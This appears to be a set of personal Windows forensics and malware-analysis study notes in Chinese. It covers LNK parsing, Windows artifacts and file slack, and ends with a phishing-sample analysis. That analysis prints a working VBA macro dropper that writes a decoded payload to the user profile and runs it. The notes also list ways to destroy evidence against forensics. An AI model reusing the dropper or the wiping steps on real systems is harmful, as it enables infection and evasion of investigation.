1 (SW_SHOWNORMAL / SW_NORMAL) Hot key value: 0x0000 (None) Link flags: 0x0020009b (HasLinkTargetIDList, HasLinkInfo, HasRelativePath, HasWorkingDir, IsUnicode, DisableKnownFolderTracking) [Link Target ID List] CLSID: 031e4825-7b94-4dc3-b131-e946b44c8dd5 = UsersLibraries CLSID: 7b0db17d-9cd2-4a93-9733-46cc89022e7c = DocumentsLibrary [Property Store] Property set GUID: b725f130-47ef-101a-a5f1-02608c9eebac ID: System.ItemTypeText Value: 0x001f (VT_LPWSTR) My Documents ID: System.DateCreated Value: 0x0040 (VT_FILETIME) 04/30/2010 (00:10:56.0) [UTC] ID: System.FileAttributes Value: 0x0013 (VT_UI4) 0x00000011 = 17 ID: System.DateModified Value: 0x0040 (VT_FILETIME) 02/01/2011 (01:43:28.0) [UTC] ID: System.DateAccessed Value: 0x0040 (VT_FILETIME) 02/01/2011 (01:43:28.0) [UTC] Property set GUID: 446d16b1-8dad-4870-a748-402ea43d788c ID: System.ThumbnailCacheId Value: 0x0015 (VT_UI8) 0xd3331b2d2174203b = 15218537446463774779 Property set GUID: 28636aa6-953d-11d2-b5d6-00c04fd918d0 ID: System.SFGAOFlags Value: 0x0013 (VT_UI4) 0x7080017f = 1887437183 ID: 32 Value: 0x1011 (VT_VECTOR | VT_UI1) Vector count: 385 CLSID: 20d04fe0-3aea-1069-a2d8-08002b30309d = My Computer Drive: C:\\ Last modified: 04/30/2010 (00:10:54.0) [UTC] Folder attributes: 0x00000011 (FILE_ATTRIBUTE_READONLY, FILE_ATTRIBUTE_DIRECTORY) Short directory name: Users Date created: 07/14/2009 (02:37:06.0) [UTC] Last accessed: 04/30/2010 (00:10:54.0) [UTC] Long directory name: Users Argument: @shell32.dll,-21813 Last modified: 04/30/2010 (00:11:30.0) [UTC] Folder attributes: 0x00000010 (FILE_ATTRIBUTE_DIRECTORY) Short directory name: CLIFF~1.CAV Date created: 04/30/2010 (00:10:54.0) [UTC] Last accessed: 04/30/2010 (00:11:30.0) [UTC] Long directory name: Cliff.Cavin Last modified: 02/01/2011 (01:43:28.0) [UTC] Folder attributes: 0x00000011 (FILE_ATTRIBUTE_READONLY, FILE_ATTRIBUTE_DIRECTORY) Short directory name: DOCUME~1 Date created: 04/30/2010 (00:10:56.0) [UTC] Last accessed: 02/01/2011 (01:43:28.0) [UTC] Long directory name: Documents Argument: @shell32.dll,-21770 ID: System.ParsingName Value: 0x001f (VT_LPWSTR) Documents ID: System.ItemType Value: 0x001f (VT_LPWSTR) Directory Property set GUID: 1e3ee840-bc2b-476c-8237-2acd1a839b22 ID: 8 Value: 0x001f (VT_LPWSTR) C:\\Users\\Cliff.Cavin\\Documents ID: System.Kind Value: 0x101f (VT_VECTOR | VT_LPWSTR) Vector count: 1 : folder [/Property Store] [Property Store] Property set GUID: b725f130-47ef-101a-a5f1-02608c9eebac ID: System.ItemTypeText Value: 0x001f (VT_LPWSTR) OWAT Proposal - Malone ID: System.DateCreated Value: 0x0040 (VT_FILETIME) 02/01/2011 (01:42:48.0) [UTC] ID: System.Size Value: 0x0015 (VT_UI8) 0x000000000000ba4e = 47694 ID: System.FileAttributes Value: 0x0013 (VT_UI4) 0x00000020 = 32 ID: System.DateModified Value: 0x0040 (VT_FILETIME) 02/01/2011 (01:42:50.0) [UTC] ID: System.DateAccessed Value: 0x0040 (VT_FILETIME) 02/01/2011 (01:42:50.0) [UTC] Property set GUID: 446d16b1-8dad-4870-a748-402ea43d788c ID: System.ThumbnailCacheId Value: 0x0015 (VT_UI8) 0x3b279efd2943a71e = 4262550382485677854 Property set GUID: 28636aa6-953d-11d2-b5d6-00c04fd918d0 ID: System.SFGAOFlags Value: 0x0013 (VT_UI4) 0x48400177 = 1212154231 ID: 32 Value: 0x1011 (VT_VECTOR | VT_UI1) Vector count: 513 CLSID: 20d04fe0-3aea-1069-a2d8-08002b30309d = My Computer Drive: C:\\ Last modified: 04/30/2010 (00:10:54.0) [UTC] Folder attributes: 0x00000011 (FILE_ATTRIBUTE_READONLY, FILE_ATTRIBUTE_DIRECTORY) Short directory name: Users Date created: 07/14/2009 (02:37:06.0) [UTC] Last accessed: 04/30/2010 (00:10:54.0) [UTC] Long directory name: Users Argument: @shell32.dll,-21813 Last modified: 04/30/2010 (00:11:30.0) [UTC] Folder attributes: 0x00000010 (FILE_ATTRIBUTE_DIRECTORY) Short directory name: CLIFF~1.CAV Date created: 04/30/2010 (00:10:54.0) [UTC] Last accessed: 04/30/2010 (00:11:30.0) [UTC] Long directory name: Cliff.Cavin Last modified: 02/01/2011 (01:43:28.0) [UTC] Folder attributes: 0x00000011 (FILE_ATTRIBUTE_READONLY, FILE_ATTRIBUTE_DIRECTORY) Short directory name: DOCUME~1 Date created: 04/30/2010 (00:10:56.0) [UTC] Last accessed: 02/01/2011 (01:43:28.0) [UTC] Long directory name: Documents Argument: @shell32.dll,-21770 File size: 47694 bytes Last modified: 02/01/2011 (01:42:50.0) [UTC] File attributes: 0x00000020 (FILE_ATTRIBUTE_ARCHIVE) 8.3 filename: OWATPR~1.DOC Date created: 02/01/2011 (01:42:48.0) [UTC] Last accessed: 02/01/2011 (01:42:50.0) [UTC] Long filename: OWAT Proposal - Malone.docx ID: System.ParsingName Value: 0x001f (VT_LPWSTR) OWAT Proposal - Malone.docx ID: System.ItemType Value: 0x001f (VT_LPWSTR) .docx Property set GUID: 1e3ee840-bc2b-476c-8237-2acd1a839b22 ID: 8 Value: 0x001f (VT_LPWSTR) C:\\Users\\Cliff.Cavin\\Documents\\OWAT Proposal - Malone.docx ID: System.Kind Value: 0x101f (VT_VECTOR | VT_LPWSTR) Vector count: 1 : document [/Property Store] [Link Info] Location flags: 0x00000001 (VolumeIDAndLocalBasePath) Drive type: 3 (DRIVE_FIXED) Drive serial number: 78eb-e13b Volume label (ASCII): Local path (ASCII): C:\\Users\\Cliff.Cavin\\Documents\\OWAT Proposal - Malone.docx [String Data] Relative path (UNICODE): ..\\..\\..\\..\\..\\Documents\\OWAT Proposal - Malone.docx Working Directory (UNICODE): C:\\Users\\Cliff.Cavin\\Documents [Metadata Property Store] Property set GUID: 46588ae2-4cbc-4338-bbfc-139326986dce [Distributed Link Tracker Properties] Version: 0 NetBIOS name: cavin Droid volume identifier: 35e6cda4-852f-4c89-87b8-1b863ffc4d04 Droid file identifier: ad7a62e2-2cd5-11e0-b805-000c297f12a0 Birth droid volume identifier: 35e6cda4-852f-4c89-87b8-1b863ffc4d04 Birth droid file identifier: ad7a62e2-2cd5-11e0-b805-000c297f12a0 MAC address: 00:0c:29:7f:12:a0 UUID timestamp: 01/31/2011 (01:01:47.125) [UTC] UUID sequence number: 14341 Unknown data at end of file. [Filename]: D:\\NTU\\Taiwan Holy High 8-th\\Windows OS Forensics\\LNK\\[???]????_20230726.pptx.LNK [Header] Date created: 07/26/2023 (01:33:25.69) [UTC] Last accessed: 07/28/2023 (07:57:36.437) [UTC] Last modified: 07/26/2023 (05:31:17.399) [UTC] File size: 106313921 bytes File attributes: 0x00000020 (FILE_ATTRIBUTE_ARCHIVE) Icon index: 0 ShowWindow value: 1 (SW_SHOWNORMAL / SW_NORMAL) Hot key value: 0x0000 (None) Link flags: 0x00000083 (HasLinkTargetIDList, HasLinkInfo, IsUnicode) [Link Target ID List] CLSID: 20d04fe0-3aea-1069-a2d8-08002b30309d = My Computer Drive: D:\\ Last modified: 10/27/2022 (23:44:52.0) [UTC] Folder attributes: 0x00000010 (FILE_ATTRIBUTE_DIRECTORY) Short directory name: Training Material Date created: 10/27/2022 (23:23:16.0) [UTC] Last accessed: 07/28/2023 (07:57:16.0) [UTC] Long directory name: Training Material File size: 0 bytes Last modified: 07/26/2023 (05:31:30.0) [UTC] File attributes: 0x00000010 (FILE_ATTRIBUTE_DIRECTORY) 8.3 filename: [ Date created: 10/27/2022 (23:30:44.0) [UTC] Last accessed: 07/28/2023 (07:57:16.0) [UTC] Long filename: [2]???? File size: 106313921 bytes Last modified: 07/26/2023 (05:31:18.0) [UTC] File attributes: 0x00000020 (FILE_ATTRIBUTE_ARCHIVE) Long filename: [???]????_20230726.pptx Date created: 07/26/2023 (01:33:26.0) [UTC] Last accessed: 07/28/2023 (07:57:38.0) [UTC] Long filename: [???]????_20230726.pptx [Link Info] Location flags: 0x00000001 (VolumeIDAndLocalBasePath) Drive type: 3 (DRIVE_FIXED) Drive serial number: 12a0-18b7 Volume label (ASCII): 新增磁碟區 Local path (ASCII): D:\\Training Material\\[2]技術課程\\[台科大]資訊安全_20230726.pptx [Metadata Property Store] Property set GUID: 446d16b1-8dad-4870-a748-402ea43d788c ID: 104 Value: 0x0048 (VT_CLSID) CLSID: ae790946-95c1-4d5f-b2cb-6d69c7e0fb6a [Distributed Link Tracker Properties] Version: 0 NetBIOS name: desktop-3f9joqf Droid volume identifier: b60a791e-9325-4178-8dd5-522b787ff4f2 Droid file identifier: f6061f31-2b45-11ee-9545-e8f408da009c Birth droid volume identifier: b60a791e-9325-4178-8dd5-522b787ff4f2 Birth droid file identifier: f6061f31-2b45-11ee-9545-e8f408da009c MAC address: e8:f4:08:da:00:9c UUID timestamp: 07/25/2023 (23:49:57.539) [UTC] UUID sequence number: 5445 Unknown data at end of file. [Filename]: D:\\NTU\\Taiwan Holy High 8-th\\Windows OS Forensics\\LNK\\[???]????_v0.6.pptx.LNK [Header] Date created: 07/28/2023 (09:12:00.832) [UTC] Last accessed: 09/09/2023 (05:22:47.979) [UTC] Last modified: 07/29/2023 (08:14:33.586) [UTC] File size: 51209593 bytes File attributes: 0x00000020 (FILE_ATTRIBUTE_ARCHIVE) Icon index: 0 ShowWindow value: 1 (SW_SHOWNORMAL / SW_NORMAL) Hot key value: 0x0000 (None) Link flags: 0x00000083 (HasLinkTargetIDList, HasLinkInfo, IsUnicode) [Link Target ID List] CLSID: 20d04fe0-3aea-1069-a2d8-08002b30309d = My Computer Drive: D:\\ Last modified: 10/27/2022 (23:44:52.0) [UTC] Folder attributes: 0x00000010 (FILE_ATTRIBUTE_DIRECTORY) Short directory name: Training Material Date created: 10/27/2022 (23:23:16.0) [UTC] Last accessed: 09/09/2023 (05:10:24.0) [UTC] Long directory name: Training Material File size: 0 bytes Last modified: 07/26/2023 (05:31:28.0) [UTC] File attributes: 0x00000010 (FILE_ATTRIBUTE_DIRECTORY) 8.3 filename: [ Date created: 10/27/2022 (23:28:02.0) [UTC] Last accessed: 09/09/2023 (05:10:24.0) [UTC] Long filename: [1]???? File size: 0 bytes Last modified: 08/31/2023 (13:40:22.0) [UTC] File attributes: 0x00000010 (FILE_ATTRIBUTE_DIRECTORY) 8.3 filename: 盬弳\u0026#39;Y Date created: 07/26/2023 (05:31:24.0) [UTC] Last accessed: 09/09/2023 (05:10:24.0) [UTC] Long filename: ??? File size: 51209593 bytes Last modified: 07/29/2023 (08:14:34.0) [UTC] File attributes: 0x00000020 (FILE_ATTRIBUTE_ARCHIVE) Long filename: [???]????_v0.6.pptx Date created: 07/28/2023 (09:12:02.0) [UTC] Last accessed: 09/09/2023 (05:22:44.0) [UTC] Long filename: [???]????_v0.6.pptx [Link Info] Location flags: 0x00000001 (VolumeIDAndLocalBasePath) Drive type: 3 (DRIVE_FIXED) Drive serial number: 12a0-18b7 Volume label (ASCII): 新增磁碟區 Local path (ASCII): D:\\Training Material\\[1]課程簡報\\台科大\\[台科大]資訊安全_v0.6.pptx [Metadata Property Store] Property set GUID: 446d16b1-8dad-4870-a748-402ea43d788c ID: 104 Value: 0x0048 (VT_CLSID) CLSID: ae790946-95c1-4d5f-b2cb-6d69c7e0fb6a [Distributed Link Tracker Properties] Version: 0 NetBIOS name: desktop-3f9joqf Droid volume identifier: b60a791e-9325-4178-8dd5-522b787ff4f2 Droid file identifier: 5099b7db-2d05-11ee-9549-e8f408da009c Birth droid volume identifier: b60a791e-9325-4178-8dd5-522b787ff4f2 Birth droid file identifier: 5099b7db-2d05-11ee-9549-e8f408da009c MAC address: e8:f4:08:da:00:9c UUID timestamp: 07/28/2023 (05:12:14.540) [UTC] UUID sequence number: 5449 Unknown data at end of file. Press any key to continue . . . :::\n==利用手動的方式parse lnk file== # SO代表offset，LE代表取多少個bytes\n標的檔案路徑 如果有特別幫Parition取名字的話，lnk就會把partition的名字放在兩個固定byte中間，也就是10 00 00 00和00中間，可以用以下的script把big5轉成中文 \u0026gt;\u0026gt;\u0026gt; partition_name = \u0026#39;B7 73 BC 57 BA CF BA D0 B0 CF\u0026#39;.split(\u0026#39; \u0026#39;) \u0026gt;\u0026gt;\u0026gt; \u0026#34;\u0026#34;.join([bytes.fromhex(\u0026#34;\u0026#34;.join(partition_name[i:i+2])).decode(\u0026#39;big5\u0026#39;) for i in range(0, len(partition_name), 2)]) \u0026#39;新增磁碟區\u0026#39; 標的檔案路徑之磁碟序號 (Drive serial number) 順序是倒著看，以此為例就是D4 21 3D DD，如果把硬碟換掉/重灌/對partition有其他異動都會使這個serial number和原本不一樣 :::info 如何知悉本電腦的磁區序號: $ dir /a 磁碟區 D 中的磁碟是 新增磁碟區 磁碟區序號: ECC7-4C55 ... $ vol 磁碟區 D 中的磁碟是 新增磁碟區 磁碟區序號: ECC7-4C55 $ vol c: 磁碟區 C 中的磁碟沒有標籤。 磁碟區序號: 1AA2-C9B1 ::: 標的檔案時間戳記(在Header欄位中，如下圖) SO = 28 / LE = 24(Timestamp開時前的四個bytes都是固定20 00 00 00) 因為我的HxD也沒有出現特別編輯器的視窗，所以就土法煉鋼的把東西轉換 \u0026gt;\u0026gt;\u0026gt; create_time = \u0026#39;64 B4 1C 07 EF 09 D8 01\u0026#39; \u0026gt;\u0026gt;\u0026gt; create_time = int(\u0026#34;\u0026#34;.join(create_time.split(\u0026#39; \u0026#39;)[::-1]), 16) 132867111228585060 \u0026gt;\u0026gt;\u0026gt; access_time = \u0026#39;74 5A 85 0C F0 09 D8 01\u0026#39; \u0026gt;\u0026gt;\u0026gt; access_time = int(\u0026#34;\u0026#34;.join(access_time.split(\u0026#39; \u0026#39;)[::-1]), 16) 132867115614296692 \u0026gt;\u0026gt;\u0026gt; modify_time = \u0026#39;74 5A 85 0C F0 09 D8 01\u0026#39; \u0026gt;\u0026gt;\u0026gt; modify_time = int(\u0026#34;\u0026#34;.join(modify_time.split(\u0026#39; \u0026#39;)[::-1]), 16) 132867115614296692 \u0026gt;\u0026gt;\u0026gt; import datetime \u0026gt;\u0026gt;\u0026gt; def ad_timestamp(timestamp): ... if timestamp != 0: ... return datetime.datetime(1601, 1, 1) + datetime.timedelta(seconds=timestamp/10000000) ... return np.nan ... \u0026gt;\u0026gt;\u0026gt; ad_timestamp(create_time) datetime.datetime(2022, 1, 15, 9, 5, 22, 858505) \u0026gt;\u0026gt;\u0026gt; ad_timestamp(access_time) datetime.datetime(2022, 1, 15, 9, 12, 41, 429668) \u0026gt;\u0026gt;\u0026gt; ad_timestamp(modify_time) datetime.datetime(2022, 1, 15, 9, 12, 41, 429668) 的確和lnk parser上的時間一模一樣，或是也可以像講師上課的時候提到的線上工具endian convert, ldap timestamp convert 標的檔案大小 SO = 52 / LE = 8 順序也是倒著看 \u0026gt;\u0026gt;\u0026gt; file_size = \u0026#39;70 8A 30 02 00 00 00 00\u0026#39; \u0026gt;\u0026gt;\u0026gt; int(\u0026#34;\u0026#34;.join(file_size.split(\u0026#39; \u0026#39;)[::-1]), 16) 36735600 標的檔案 ObjectID 有一點複雜，但從上往下看 紅色框起來的是不會變動的16 bytes 滑鼠反白起來的15 bytes代表NetBIOS name 後面跟著一格null byte代表隔斷符號 淺綠色+淺藍色 = New Volume ID 淺米色+淺黃色 = New Object ID 深綠色+深藍色 = Birth Volume ID 深紅色+深黃色 = Birth Object ID Birth和New的差別就是，如果哪一天把該檔案拉到其他地方，則new會和birth的部分不一樣，更準確的說，是把檔案從一個NTFS的檔案系統中換到另外一個NTFS的檔案系統時，才會更新此object/volume ID，如果是換到FAT32的話，會沒有變動 標的檔案所在主機之 MAC Address 就如上圖所列的最後一個欄位，也就是土黃色的區塊(其實如果new object ID沒變的話，最後6個bytes也會是MAC address) UUID 時間戳記 這個時間戳記是取自深黃色的前8個bytes，先像前面一樣轉換成big endian然後轉成int，再扣掉5748192000000000，詳細可以看泛科學的文章 \u0026gt;\u0026gt;\u0026gt; timestamp = \u0026#39;DF 94 76 93 E1 75 EC 01\u0026#39; \u0026gt;\u0026gt;\u0026gt; timestamp = int(\u0026#34;\u0026#34;.join(timestamp.split(\u0026#39; \u0026#39;)[::-1]), 16) \u0026gt;\u0026gt;\u0026gt; timestamp -= 5748192000000000 \u0026gt;\u0026gt;\u0026gt; ad_timestamp(timestamp) datetime.datetime(2022, 1, 15, 9, 0, 24, 375626) UUID Sequence 編號 這個講師沒有時間講，所以我自己用現有的檔案自己推敲應該是先取MAC address之前的兩個bytes，然後把第一個byte減掉0x80，再把全部的byte轉乘int就是了 \u0026gt;\u0026gt;\u0026gt; uuid_num = \u0026#39;90 A7\u0026#39;.split(\u0026#39; \u0026#39;) \u0026gt;\u0026gt;\u0026gt; int(hex(int(uuid_num[0], 16)-0x80)[2:]+uuid_num[1], 16) 4263 延伸閱讀 # Analyzing malicious LNK file EMF - Enhanced MetaFile format\n"},{"id":477,"href":"/security/course/tai.holyhigh/windows-os-forensics/taiwanholyhigh---windows-forensics---windows-artifacts/","title":"TaiwanHolyHigh - Windows Forensics - Windows Artifacts","section":"Securities","content":" TaiwanHolyHigh - Windows Forensics - Windows Artifacts # [TOC]\n:::info 以下引用若無特別說明皆來自於講師的上課簡報 :::\nArtifacts Background # 使用者操作 Windows 作業系統時會在系統中留下或產生許多行為紀錄，稱之為 Artifacts\nArtifacts種類 特定路徑或資料夾: Program Files/Program Data Download Temp$\\to$這在玩分析memory中很常出現 電腦特定檔案: LNK Email$\\to$這在玩分析memory中也很常出現 系統還原檔(VSS, volume shadow copy): 站在藍隊的角度可以藉此知道受害者的遭到入侵的一些證據；站在紅隊的角度可以藉此撈到一些受害者的基敏資料 Artifacts分析面向 檔案Metadata: Timestamp(一般檔案的MAC time至少有兩個, Modify/Access/Create Time)可以藉此知道檔案的異動時間 應用程式: 記憶體: volatility可以針對某個PID dump出執行該process的memory，也是常見的技巧 Prefetch File 一般位於C槽windows文件夾下（C:\\Windows\\Prefetch），主要是用來存放系統已訪問的文件預讀信息；一開始創建此文件夾主要是為了加快系統的啟動過程。\n使用者的操作行為 Audit(AD很常碰到的event ID: 4662\u0026hellip;) Volatility的console可以看到駭客的command Volatility的malfind可以看到惡意注入的payload\u0026hellip; 網路行為 Volatility的netscan Most Recently Used(MRU) Background # 就是泛指各種windows存取使用者最近access過的檔案、路徑或網路位置，是一種行為，攻防兩端都會注意的地方\nOverview 攻擊者會留下的足跡: .lnk, Jump List, User Assist Registry, Prefetch，如果攻擊者想要植入惡意程式，鑑識可以從以上四個地方看出這個intention Jump List就有點像是一個shortcut，可以跳到某個地方執行或開啟something\nUser Assist Registry\n個別使用者近期執行過的行為\n因為我的基碼內都是空的所以沒辦法demo，不過按照上課講的重點，通常會有兩種檔案，一個是以ascii顯示路徑的檔案，這通常是沒有執行過的東西；另外一種是以rot13編碼的路徑，這就是有執行過的\n"},{"id":478,"href":"/security/course/tai.holyhigh/windows-os-forensics/taiwanholyhigh---windows-forensics---windows%E6%AA%94%E6%A1%88%E7%B3%BB%E7%B5%B1%E8%88%87%E9%82%84%E5%8E%9F/","title":"TaiwanHolyHigh - Windows Forensics - Windows檔案系統與還原","section":"Securities","content":" TaiwanHolyHigh - Windows Forensics - Windows檔案系統與還原 # :::spoiler TOC [TOC] :::\nBackground # What is cluster or sector?\n基本磁碟結構 磁碟儲存最小單位為sector，每一個sector包含了512bytes的資訊內容。但用sector當單位來儲存效率會很差，一般不會以一個sector當作存取檔案的單位，而是以cluster為一基本檔案單位，每一個cluster是架構在sector的2次方倍數上。假定連續的8個sector所構成一個cluster，其大小就為512×8=4096bytes(4K)，如此在存取資料時會以8個sector連續讀取而提升了相對效率。但並不是讓單位cluster越大越好，因為cluster越大相對的可能會浪費許多磁碟空間，例如設定以4K為一個cluster而要儲存的檔案內容只有1K，但這個小檔案還是佔用掉一個cluster的空間，其他3K就浪費掉了。所在考慮cluster的規劃時，需要同時考慮到檔案讀取的效能與檔案大小是否會浪費硬碟空間。\nFile Slack 舉例來說如果一個檔案A，大小是4個sector(2048 bytes)，現在將其刪除後又存入一個檔案B在同一位置，但其大小只有1.5個sector(768 bytes)，則後面沒有被填滿的2.5個sector事實上還殘留檔案A的一些資訊，尚未填滿的該sector(Ram Slack)+完整的兩個sector(Disk/Residual Slack)就是file slack\n會有一點小複雜，反正file slack就是一個完整cluster(如果按照中FAT16來格式化128MB來說就是4個sectors)沒有被填滿的部分就對了，而ran slack或是disk(residual) slack只是在區分這些沒有被填滿的區塊而已\n==比較表格==\n稍微解釋一下為甚麼FAT16是單一cluster的sector數量比較多，因為按照他自己的定義，最大的cluster數量不能超過65526，也就是說如果硬碟的容量變大，單一cluster所除下來的sector數量就越多，舉例: 若一張記憶卡的大小是128MB$\\to$134217728 bytes，單一cluster最少需要4個sectors $$ 134217728/512/65526\\approx 4 $$ 所以如果記憶卡大小是512MB$\\to$，536870912 bytes，單一cluster最少需要16個sectors $$ 536870912/512/65526\\approx 16 $$ 當然，這樣的空間使用率是很差的，因為一個cluster就意味著一間總統套房，若所有的檔案不分大小都住進總統套房，就會造成很多浪費，或甚至是有很多file slack產生，試想如果像512MB一樣，一個cluster有16個sector，代表該總統套房可以容納$16*512=8192 bytes$，如果電腦中都是小檔案居多(1kB之類的)，那有很多空間就會浪費掉，但對於鑑識來說遺留的東西越多越能夠還原很多真相\n以攻擊者或一般使用者來說，如何達到真正的毀屍滅跡?\nEncryption: 工具veracrypt File Wipe: 工具file shredder Partition Wipe: 工具 Windows Format Fast: 快速格式化 Non-Fast: 完整格式化 差別就是 儲存檔案的時候， 除了在儲存區寫入檔案資料以外，也會在開頭一個小區塊的\u0026quot;檔案表\u0026quot;輸入相關資訊;快速格式化是只把開頭的檔案表重寫，真正儲存檔案資訊的部份則沒有更動，但是系統讀到檔案表顯示是\u0026quot;空白\u0026quot;，就會把這張片子當成是空片，就不管儲存區有沒有資料，直接覆蓋過去；換句話說，若是檔案表有標明某區存有某資料，則儲存時就會跳過這區不覆蓋 完整格式化會對格式化的區域進行讀寫測試，就是確定壞軌。快速格式化沒有\nPhysical Destroy: 碎(記得敲碎一點才不容易在無塵室中還原) 燒 溶(不建議) 磁(消磁) 以攻擊者的角度來說，最少要做到第四步之前，才比較沒有那麼容易的透過鑑識還原資料\n"},{"id":479,"href":"/job/interview/teamt5%E7%AD%86%E8%A9%A6%E9%A1%8C%E7%9B%AE%E7%AD%86%E8%A8%98/","title":"TeamT5筆試題目筆記","section":"Jobs","content":" TeamT5筆試題目筆記 # :::info 前言: 通常我自己拿到一隻樣本，起手式會先搜一下hash，VirusTotal如果有紀錄的話最好，再來會丟到AnyRun看一下動態sandbox的狀態為何，但不確定這樣的操作是否符合本次筆試的預期，所以我會先設法在本機VM內分析看看，如果有利用這幾個online tools而得知的資訊，會再行標註 ::: :::danger 經過二階面試後，用線上的工具例如VirusTotal和AnyRun都是被嚴格禁止的。 第一個樣本總花費時間: 2天/第二個樣本總花費時間: 4天 :::\n樣本(93f33e4e9a732de665510aa5fdc565fc00bcf5e28101c5cc55b5b16f94288b8a) # 惡意程式 # 檔案資訊 # DIE(Detect It Easy) 看起來是一個HTML的純文字檔案\nFile/Stat/Exiftool 從以下結果來看，是一個SMTP的郵件檔案，並且是純文字的形式，所以直覺上可能和Outlook或是Firefox Thunderbird有關係，以binwalk的結果來說，他應該有壓縮一些內容在其中，如果實際丟到Any.Run的話會發現的確有很多檔案被compressed 或者是說，從檔案內容來看(HxD)，會發現data帶了一個base64的file，decode會發現是0x50 4B 03 04 :::spoiler Command Result\n$ file 93f33e4e9a732de665510aa5fdc565fc00bcf5e28101c5cc55b5b16f94288b8a 93f33e4e9a732de665510aa5fdc565fc00bcf5e28101c5cc55b5b16f94288b8a: SMTP mail, ASCII text, with CRLF line terminators $ exiftool 93f33e4e9a732de665510aa5fdc565fc00bcf5e28101c5cc55b5b16f94288b8a ExifTool Version Number : 12.40 File Name : 93f33e4e9a732de665510aa5fdc565fc00bcf5e28101c5cc55b5b16f94288b8a Directory : . File Size : 180 KiB File Modification Date/Time : 2023:08:14 11:54:39+08:00 File Access Date/Time : 2024:02:29 16:55:48+08:00 File Inode Change Date/Time : 2024:02:29 16:55:48+08:00 File Permissions : -rwxrwxrwx File Type : TXT File Type Extension : txt MIME Type : text/plain MIME Encoding : us-ascii Newlines : Windows CRLF Line Count : 2410 Word Count : 2741 $ stat 93f33e4e9a732de665510aa5fdc565fc00bcf5e28101c5cc55b5b16f94288b8a File: 93f33e4e9a732de665510aa5fdc565fc00bcf5e28101c5cc55b5b16f94288b8a Size: 184712 Blocks: 368 IO Block: 4096 regular file Device: 66h/102d Inode: 1688849860790082 Links: 1 Access: (0777/-rwxrwxrwx) Uid: ( 1000/ sbk6401) Gid: ( 1000/ sbk6401) Access: 2024-02-29 16:55:48.949690200 +0800 Modify: 2023-08-14 11:54:39.000000000 +0800 Change: 2024-02-29 16:55:48.949690200 +0800 Birth: - $ binwalk 93f33e4e9a732de665510aa5fdc565fc00bcf5e28101c5cc55b5b16f94288b8a DECIMAL HEXADECIMAL DESCRIPTION -------------------------------------------------------------------------------- 4244 0x1094 HTML document header 5554 0x15B2 HTML document footer 73264 0x11E30 StuffIt Deluxe Segment (data): fWm1 169908 0x297B4 IMG0 (VxWorks) header, size: 218780743 :::\n執行流程 # 因為這是一個SMTP的檔案，所以先用VM的mail看一下裡面的資訊，沒意外的話根據上面的敘述，這應該是一個phishing email，並且把內文偽裝成印度的MHA政府部門(Ministry of Home Affairs, 內政部) 所以重點應該就是在信件中夾帶的檔案，也就是==Guidelines.xlam==，這也是一個沒有看過的extension，所以根據1的說明，看起來這個檔案可以使用巨集，看到Macro這個關鍵字直覺上就感覺不太對勁，因為看過的實際案例就蠻常出現利用Macro夾帶一些script或是惡意的command XLAM file extension may refer to a file used by a spreadsheet program called Microsoft Excel. This program enables users to create and edit spreadsheets. These files also contain a macro-enabled add-in that provides extra tools and functionality that may execute macros. XLAM files may also be used for extension of Excel provided modules.\n由於VM內沒有可以Excel，所以容許我用Any.Run Sandbox看一下中間執行的過程，首先針對前三個process，有很大的問題 Unusual execution from MS Office\n$ C:\\Users\\admin\\Glhvadia\\hbraeiwas.exe 不是很清楚這一個command line是怎麼來的，後來發現有一個VB script，從Any.Run中看不太出來他是怎麼執行的，所幸就直接在VM中安裝office來跟一下 其實一開始執行==Guidelines.xlam==時會詢問要不要啟動Macro，也就是這個時候如果啟動就會執行惡意的file→\u0026quot;C:\\Users\\admin\\Glhvadia\\hbraeiwas.exe\u0026quot;, vbNormalNoFocus\nAnalyze VBA 一開始也不知道怎麼在Excel中看VBA code，也是根據23才知道，另外，由於是第一次碰到關於VBA的問題，所以有關於要從哪一個Module開始看也不是很清楚，不過還好他只有兩個Module，雖然我看不是很確定VBA的流程，但根據AI的解析可以略知一二 Sub userothraLoadr() Dim path_othra_file As String Dim file_othra_name As String Dim fldr_othra_name As Variant Dim byt() As Byte Dim ar1othra() As String file_othra_name = \u0026#34;hbraeiwas\u0026#34; fldr_othra_name = Environ$(\u0026#34;USERPROFILE\u0026#34;) \u0026amp; \u0026#34;\\Glhvadia\\\u0026#34; If Dir(fldr_othra_name, vbDirectory) = \u0026#34;\u0026#34; Then MkDir (fldr_othra_name) End If path_othra_file = fldr_othra_name \u0026amp; file_othra_name \u0026amp; \u0026#34;.e\u0026#34; If InStr(Application.OperatingSystem, \u0026#34;6.02\u0026#34;) \u0026gt; 0 Or InStr(Application.OperatingSystem, \u0026#34;6.03\u0026#34;) \u0026gt; 0 Then ar1othra = Split(UserForm1.TextBox2.Text, \u0026#34;i\u0026#34;) Else ar1othra = Split(UserForm1.TextBox1.Text, \u0026#34;i\u0026#34;) End If Dim btsothra() As Byte Dim linothra As Double linothra = 0 For Each vl In ar1othra ReDim Preserve btsothra(linothra) btsothra(linothra) = CByte(vl) linothra = linothra + 1 Next Open path_othra_file \u0026amp; \u0026#34;xe\u0026#34; For Binary Access Write As #3 Put #3, , btsothra Close #3 Shell path_othra_file \u0026amp; \u0026#34;xe\u0026#34;, vbNormalNoFocus End Sub 這個script簡單來說就是在做malware payload的extract，原本作者把惡意的payload scramble之後，當victim同意啟動Macro，他會再unscramble，可以看到下圖，他會依照不同的Application Version，選擇要用哪一個scramble payload接著把這些bits轉成bytes後寫到某一個檔案中，並且用shell執行該檔案，以上這些操作都極其詭異，另外他把檔案寫在\nEnviron$(\u0026#34;USERPROFILE\u0026#34;) \u0026amp; \u0026#34;\\Glhvadia\\hbraeiwas\u0026#34; :::danger 這一段是錯的，他看的版本是OS的版本號，來決定要用哪一隻Payload，因為這和後面.NET的版很也有關係 ::: 實際去看也的確是在這邊 Anaylize hbraeiwas.exe 根據DIE的解析，這是一個用.NET寫的script，我之前碰到.NET的例子不多，唯一有碰過的reverse經驗是來自臺大計安的welcome題-Nine \u0026amp; Nine-Revenge 一開始並不知道要先看哪裡，所以看了一些.NET reversing的文章，發現可以先從自定義的module開始看，也就是hbraeiwas這個class，如下圖 透過copilot的解析可以很方便的看出這個程式的主要功能是解壓縮一個 ZIP 檔案並啟動其中包含的應用程式。這種行為常見於一些惡意軟體中，因為它可以用於自解壓縮並執行惡意程式碼，如果直接用動態debugger，就會更清楚他把東西unzip到哪邊去，他是decompress到C:\\ProgramData\\Hdlharas\\dlrarhsiva.exe，並且實際執行 再詳細說明一下，他先instantiate 